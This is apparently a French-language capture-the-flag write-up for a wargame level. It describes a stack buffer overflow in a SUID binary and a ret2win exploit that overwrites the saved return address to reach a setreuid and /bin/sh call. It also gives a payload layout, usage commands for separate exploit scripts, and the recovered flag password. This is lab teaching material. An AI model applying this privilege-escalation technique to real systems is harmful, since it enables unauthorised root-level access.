# level01 — Stack buffer overflow → ret2win (`read`)

Objectif : passer de `level01` à `flag01` et récupérer `/home/flag01/.pass`.

## Cible

Binaire `~/ono` sur la VM : **SUID `flag01`** (uid 1018), non-PIE, pas de source
fournie (reversé au `objdump`/`gdb`).

```c
void run_diagnostic(void) {
    char buf[64];                 // rbp-0x40
    print_header();
    read(0, buf, 0x100);          // <-- lit 256 o dans 64 : débordement
    strncpy(ctx.last, buf, 0x3f);
    if (strncmp(buf, "ONO_", 4) == 0) ...   // identifiant attendu
    else { puts("Unknown operator"); if (--ctx.tries == 0) exit(1); }
}

void maintenance_exec(long arg) {
    if (arg == 0xdeadbeef) {      // <-- check jamais atteint normalement
        setreuid(geteuid(), geteuid());
        execl("/bin/sh", "sh", NULL);
    }
}
```

| Protection | État |
|------------|------|
| PIE | **non** (EXEC, base `0x400000`, adresses fixes) |
| Stack canary | absent |
| ASLR | indifférent : on saute sur du **code** à adresse fixe |

## Faille

`read(0, buf, 0x100)` lit jusqu'à **256 octets** dans un buffer de **64**. Le
`saved RIP` est à **72 octets** du début du buffer (`0x40` de buffer + `8` de
saved RBP). `maintenance_exec` contient la seule branche qui donne un shell,
mais elle est gardée par `arg == 0xdeadbeef` — condition jamais vraie via le
flux normal.

## Exploitation (ret2win)

Pas de shellcode : on réécrit `saved RIP` pour sauter **juste après le check**,
directement sur `setreuid`+`execl`, à `0x401292` (`disas maintenance_exec`).

```
[ 72 o de filler ][ saved RIP = 0x401292 ]
                        └── maintenance_exec, après le cmp 0xdeadbeef
```

### Le piège : `read` est gourmand

`read` lit les 256 octets disponibles **en un seul appel**. Si on envoie le
payload et les commandes du shell à la suite, `read` avale **tout** ; le
`/bin/sh` obtenu démarre alors avec un stdin déjà vide (EOF) et quitte
aussitôt. Il faut donc :

1. se resynchroniser sur le prompt (`recvuntil("ID:")`) ;
2. envoyer le **payload seul** → `read` ne prend que lui, `execl("/bin/sh")` part ;
3. laisser le shell démarrer (petit délai) **puis** piloter : `id`, `cat
   /home/flag01/.pass`, `exit`.

## Utilisation

Depuis la machine locale (la VM doit écouter en SSH, port 4242 par défaut) :

```sh
cd ressource
./run.sh                 # copie exploit.py sur la VM (/tmp) et l'exécute LÀ-BAS
./run.sh <host> <port>   # cible personnalisée
```

Sur la VM directement :

```sh
python3 exploit.py       # ou :  bash exploit.sh
```

Les deux impriment l'UID obtenu et le flag :

```
uid=1018(flag01) gid=1004(level01) groups=1004(level01),1001(levelgroup)
3309s5bx9kagi0z0qt0erxvivievlh86
```

Ce flag est le mot de passe de `flag01` / `level02`.

## Fichiers

| Fichier | Rôle |
|---------|------|
| `ressource/run.sh` | Driver local : SSH, copie les scripts dans `/tmp` puis les exécute sur la VM |
| `ressource/exploit.py` | Exploit pwntools (ret2win, resync prompt + envoi différé des commandes) |
| `ressource/exploit.sh` | Même exploit, wrapper bash autonome (à lancer sur la VM) |
| `flag` | Flag récupéré |
